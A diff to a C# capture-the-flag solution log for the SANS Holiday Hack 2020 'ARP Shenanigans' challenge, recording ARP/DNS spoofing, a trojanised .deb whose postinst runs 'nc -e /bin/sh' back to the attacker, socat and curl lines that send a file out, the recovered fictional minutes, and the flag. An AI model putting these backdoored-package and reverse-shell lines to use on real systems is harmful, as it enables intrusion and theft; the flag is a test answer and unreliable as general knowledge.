@@ -3,7 +3,7 @@
 namespace Janda.CTF.SANS.HolidayHack
 {
 
-    [Challenge(Type = "Objective", Number = 9, Name = "ARP Shenanigans", Points = 4)]
+    [Challenge(Type = "Objective", Number = 9, Name = "ARP Shenanigans", Points = 4, Flag = "Tanta Kringle")]
     public class ARPShenanigans : IChallenge
     {
         private readonly ILogger<ARPShenanigans> _logger;
@@ -728,10 +728,11 @@ namespace Janda.CTF.SANS.HolidayHack
 
                 mkdir tmp
                 dpkg-deb -R original.deb tmp
+                
                 # edit DEBIAN/postinst
 
                 dpkg-deb -b tmp fixed.deb
-
+                          
 
             ".Blog(_logger, "Working with debs ");
 
@@ -792,6 +793,7 @@ namespace Janda.CTF.SANS.HolidayHack
             @"
                 let's add this to deb package so the host will send us the text
 
+                curl 10.6.0.3:80/helloworld
                 curl 10.6.0.3:80 --data-binary '@/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt'
 
             ".Blog(_logger, "Once I figure out what is wrong with DNS. It stopped working :(");
@@ -874,7 +876,365 @@ namespace Janda.CTF.SANS.HolidayHack
                 10.6.6.35 - - [30/Dec/2020 23:08:16] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
                 10.6.6.35 - - [30/Dec/2020 23:08:22] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
 
+
             ".Blog(_logger, "It is important to send only one DNS reply. This will trigger HTTP GET request where we will give back the surprice deb.");
+
+
+            @"  
+                cd debs
+                rm golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
+                mkdir temp
+                dpkg-deb -R nano_4.8-1ubuntu1_amd64.deb temp
+                nano temp/DEBIAN/postinst
+                nano temp/DEBIAN/prerm
+                dpkg-deb -b temp golang-github-huandu-xstrings-dev_1.2.1-1_all.deb
+                cd ..
+
+
+            ".Blog(_logger, "Repack deb file");
+
+
+            @"  
+                guest@a20adb74486a:~/debs/netcat$ ls -R 
+                .:
+                bin  usr
+                ./bin:
+                nc.traditional
+                ./usr:
+                share
+                ./usr/share:
+                doc  man
+                ./usr/share/doc:
+                netcat-traditional
+                ./usr/share/doc/netcat-traditional:
+                README.Debian  README.gz  changelog.Debian.gz  copyright  examples
+                ./usr/share/doc/netcat-traditional/examples:
+                contrib  data  scripts
+                ./usr/share/doc/netcat-traditional/examples/contrib:
+                ncmeter
+                ./usr/share/doc/netcat-traditional/examples/data:
+                Makefile  README  data.c  dns-any.d  nfs-0.d  pm.d  pmap-dump.d  pmap-mnt.d  rip.d  rservice.c  showmount.d  xor.c
+                ./usr/share/doc/netcat-traditional/examples/scripts:
+                README  alta  bsh  dist.sh  irc  iscan  ncp  probe  web  webproxy  webrelay  websearch
+                ./usr/share/man:
+                man1
+                ./usr/share/man/man1:
+                nc.traditional.1.gz
+
+
+                guest@a20adb74486a:~/debs/netcat$ ls -R -sh
+                .:
+                total 8.0K
+                4.0K bin  4.0K usr
+                ./bin:
+                total 36K
+                36K nc.traditional
+                ./usr:
+                total 4.0K
+                4.0K share
+                ./usr/share:
+                total 8.0K
+                4.0K doc  4.0K man
+                ./usr/share/doc:
+                total 4.0K
+                4.0K netcat-traditional
+                ./usr/share/doc/netcat-traditional:
+                total 40K
+                4.0K README.Debian   24K README.gz  4.0K changelog.Debian.gz  4.0K copyright  4.0K examples
+                ./usr/share/doc/netcat-traditional/examples:
+                total 12K
+                4.0K contrib  4.0K data  4.0K scripts
+                ./usr/share/doc/netcat-traditional/examples/contrib:
+                total 4.0K
+                4.0K ncmeter
+                ./usr/share/doc/netcat-traditional/examples/data:
+                total 52K
+                4.0K Makefile  4.0K README  8.0K data.c  4.0K dns-any.d  4.0K nfs-0.d  4.0K pm.d  4.0K pmap-dump.d  4.0K pmap-mnt.d  4.0K rip.d  4.0K rservice.c  4.0K showmount.d  4.0K xor.c
+                ./usr/share/doc/netcat-traditional/examples/scripts:
+                total 56K
+                4.0K README  4.0K alta  4.0K bsh  4.0K dist.sh  4.0K irc  4.0K iscan  4.0K ncp  4.0K probe  8.0K web  8.0K webproxy  4.0K webrelay  4.0K websearch
+                ./usr/share/man:
+                total 4.0K
+                4.0K man1
+                ./usr/share/man/man1:
+                total 4.0K
+                4.0K nc.traditional.1.gz
+                guest@a20adb74486a:~/debs/netcat$ 
+
+            ".Blog(_logger, "{x} content:", "netcat-traditional_1.10-41.1ubuntu1_amd64.deb");
+
+
+            // nc -e /bin/sh 10.6.0.3 10001
+
+
+            //guest@9cc3fc9e316e:~/debs$ cat 1/DEBIAN/postinst 
+            //#!/bin/sh
+            //set -e
+            //if [ "$1" = "configure" ]; then
+            //    update-alternatives \
+            //        --install /bin/nc nc /bin/nc.traditional 10 \
+            //        --slave /bin/netcat netcat /bin/nc.traditional \
+            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz \
+            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz
+            //fi
+            //guest@9cc3fc9e316e:~/debs$ nano 1/DEBIAN/postinst 
+            //guest@9cc3fc9e316e:~/debs$ cat 1/DEBIAN/postinst 
+            //#!/bin/sh
+            //set -e
+            //if [ "$1" = "configure" ]; then
+            //    update-alternatives \
+            //        --install /bin/nc nc /bin/nc.traditional 10 \
+            //        --slave /bin/netcat netcat /bin/nc.traditional \
+            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz \
+            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz
+            //fi
+            //nc -e /bin/sh 10.6.0.3 10001
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b 1 suriv_amd64.deb
+            //dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.
+
+
+
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=43385
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=35729 UDP.dport=domain
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35729
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py 
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=48548 UDP.dport=domain
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=48548
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3624 UDP.dport=domain
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3624
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=64350 UDP.dport=domain
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=64350
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ^C
+            //^Cguest@9cc3fc9e316e:~$                                                                                                                     │guest@9cc3fc9e316e:~$ 
+            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            //set -e
+            //if [ "$1" = "configure" ]; then
+            //    update-alternatives \
+            //        --install /bin/nc nc /bin/nc.traditional 10 \
+            //        --slave /bin/netcat netcat /bin/nc.traditional \
+            //        --slave /usr/share/man/man1/nc.1.gz nc.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz \
+            //        --slave /usr/share/man/man1/netcat.1.gz netcat.1.gz \
+            //                /usr/share/man/man1/nc.traditional.1.gz
+            //fi
+            //nc -e /bin/sh 10.6.0.3 10001
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b 1 suriv_amd64.deb
+            //dpkg-deb: building package 'netcat-traditional' in 'suriv_amd64.deb'.
+            //guest@9cc3fc9e316e:~/debs$ nc -lv 0.0.0.0 -p 10001
+            //0.0.0.0: inverse host lookup failed: Host name lookup failure
+            //listening on [any] 10001 ...
+            //invalid connection to [10.6.0.3] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 47004
+            //guest@9cc3fc9e316e:~/debs$ 
+            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            //guest@9cc3fc9e316e:~$ nano w.py]
+            //guest@9cc3fc9e316e:~$ nano w.py
+            //guest@9cc3fc9e316e:~$ chmod +x w.py
+            //guest@9cc3fc9e316e:~$ ./w
+            //-bash: ./w: No such file or directory
+            //guest@9cc3fc9e316e:~$ ./w.py 
+            //10.6.6.35 - - [31/Dec/2020 16:49:11] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
+
+
+
+            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            //guest@9cc3fc9e316e:~/debs$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
+            //Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
+            //Help the North Pole by getting command line access back to this host.
+            //Read the HELP.md file for information to help you in this endeavor.
+            //Note: The terminal lifetime expires after 30 or more minutes so be 
+            //sure to copy off any essential work you have done as you go.
+            //guest@9cc3fc9e316e:~/debs$ 
+            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            //guest@9cc3fc9e316e:~$ socat -u FILE:motd TCP:127.0.0.1:9876
+            //guest@9cc3fc9e316e:~$ 
+
+
+
+            //guest@9cc3fc9e316e:~$ ls debs/s/DEBIAN/
+            //control  md5sums
+            //guest@9cc3fc9e316e:~$ nano debs/s/DEBIAN/postinst
+            //guest@9cc3fc9e316e:~$ cat debs/s/DEBIAN/postinst 
+            //#!/bin/sh
+            //socat -u FILE:/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt TCP:10.6.0.3:10001
+            //guest@9cc3fc9e316e:~$ chmod +x debs/s/DEBIAN/postinst 
+            //guest@9cc3fc9e316e:~$ 
+
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s suriv_amd64.deb
+            //dpkg-deb: building package 'socat' in 'suriv_amd64.deb'.
+
+
+
+
+
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35729
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py 
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=48548 UDP.dport=domain
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=48548
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ./d.py 
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=3624 UDP.dport=domain
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=3624
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=64350 UDP.dport=domain
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=64350
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@9cc3fc9e316e:~$ ^C
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@9cc3fc9e316e:~$ ./d.py
+            //<- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=35024 UDP.dport=domain
+            //=> op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=35024
+            //                                                                                                                                            │guest@9cc3fc9e316e:~$ ./d.py
+            //────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+            // socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat && cat hello.txt
+
+            // 
+            //Ginger Breaddie
+            //King Moonracer
+            //Mrs. Donner
+            //Charlie In the Box
+            //Krampus
+            //Dolly
+            //Snow Miser
+            //Alabaster Snowball
+            //Queen of the Winter Spirits
+            //Opposed: 
+            //                Jack Frost
+            //Resolution carries.  Construction approved.
+            //NEW BUSINESS:
+            //Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000
+            // BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposa
+            //l, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
+            //Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.guest@9cc3fc9e316e:~/debs$ 
+            //──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+            //HELP.md  a.py  d.py  debs  motd  pcaps  scripts  w.py
+            //guest@9cc3fc9e316e:~$ cd debs/
+            //guest@9cc3fc9e316e:~/debs$ ls
+            //1  3  gedit-common_3.36.1-1_all.deb                      nano_4.8-1ubuntu1_amd64.deb                    nmap_7.80+dfsg1-2build1_amd64.deb  s                          suriv_amd64.deb
+            //2  4  golang-github-huandu-xstrings-dev_1.2.1-1_all.deb  netcat-traditional_1.10-41.1ubuntu1_amd64.deb  out.txt                            socat_1.7.3.3-2_amd64.deb  unzip_6.0-25ubuntu1_amd64.deb
+            //guest@9cc3fc9e316e:~/debs$ rm suriv_amd64.deb
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s
+            //s/                         socat_1.7.3.3-2_amd64.deb  
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s
+            //s/                         socat_1.7.3.3-2_amd64.deb  
+            //guest@9cc3fc9e316e:~/debs$ dpkg-deb -b s suriv_amd64.deb
+            //dpkg-deb: building package 'socat' in 'suriv_amd64.deb'.
+            //guest@9cc3fc9e316e:~/debs$ ./w
+            //-bash: ./w: No such file or directory
+            //guest@9cc3fc9e316e:~/debs$ cd..
+            //-bash: cd..: command not found
+            //guest@9cc3fc9e316e:~/debs$ cd ..
+            //guest@9cc3fc9e316e:~$ ./w
+            //-bash: ./w: No such file or directory
+            //guest@9cc3fc9e316e:~$ ./w.py 
+            //10.6.6.35 - - [31/Dec/2020 17:08:27] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
+
+
+            @"
+
+                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
+                Help the North Pole by getting command line access back to this host.
+                Read the HELP.md file for information to help you in this endeavor.
+                Note: The terminal lifetime expires after 30 or more minutes so be 
+                sure to copy off any essential work you have done as you go.
+
+                guest@fa903c5a8046:~$ nano a.py
+                guest@fa903c5a8046:~$ nano d.py
+                guest@fa903c5a8046:~$ nano w.py
+                guest@fa903c5a8046:~$ chmod +x a.py d.py w.py 
+                guest@fa903c5a8046:~$ mkdir debs/s
+                guest@fa903c5a8046:~$ dpkg-deb -R debs/socat_1.7.3.3-2_amd64.deb debs/s
+                guest@fa903c5a8046:~$ ifconfig
+                guest@fa903c5a8046:~$ nano debs/s/DEBIAN/postinst
+                guest@fa903c5a8046:~$ cat debs/s/DEBIAN/postinst
+                
+                #!/bin/sh
+                socat -u FILE:/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt TCP:10.6.0.2:10001
+                
+                guest@fa903c5a8046:~$ chmod +x debs/s/DEBIAN/postinst
+                guest@fa903c5a8046:~$ dpkg-deb -b debs/s debs/suriv_amd64.deb
+                dpkg-deb: building package 'socat' in 'debs/suriv_amd64.deb'.
+
+                guest@fa903c5a8046:~$ ./a.py &
+                guest@fa903c5a8046:~$ ./w.py &
+                guest@fa903c5a8046:~$ socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat &
+                [1] 179
+                guest@fa903c5a8046:~$ ./d.py
+
+                <- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:02 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=19105 UDP.dport=domain
+                => Ether.src=02:42:0a:06:00:02 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=19105
+                [1]+  Done                    socat -u TCP-LISTEN:10001,reuseaddr OPEN:hello.txt,creat
+
+    
+
+
+                NORTH POLE
+                LAND USE BOARD
+                MEETING MINUTES
+                January 20, 2020
+                Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
+                Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
+                Roll call of Board members please:
+                Chairman Jack Frost - Present
+                Vice Chairman Mother Nature - Present
+                Superman - Present
+                Clarice - Present
+                Yukon Cornelius - HERE!
+                Ginger Breaddie - Present
+                King Moonracer - Present
+                Mrs. Donner - Present
+                Tanta Kringle - Present
+                Charlie In-the-Box - Here
+                Krampus - Growl
+                Dolly - Present
+                Snow Miser - Heya!
+                Alabaster Snowball - Hello
+                Queen of the Winter Spirits - Present
+                ALSO PRESENT:
+                                Kris Kringle
+                                Pepper Minstix
+                                Heat Miser
+                                Father Time
+                Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- f
+                or people who are interested in this meeting.
+                Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
+                OLD BUSINESS: No Old Business.
+                RESOLUTIONS:
+                The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering report
+                s. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local 
+                residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. 
+                In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given
+                 her adoption of Kris Kringle as a son early in his life.  
+                Approved:
+                Mother Nature
+                Superman
+                Clarice
+                Yukon Cornelius
+                Ginger Breaddie
+                King Moonracer
+                Mrs. Donner
+                Charlie In the Box
+                Krampus
+                Dolly
+                Snow Miser
+                Alabaster Snowball
+                Queen of the Winter Spirits
+                Opposed: 
+                                Jack Frost
+                Resolution carries.  Construction approved.
+                NEW BUSINESS:
+                Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000
+                 BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposa
+                l, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
+                Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.
+
+                
+            ".Blog(_logger, "Solution");
+
         }
     }
 }
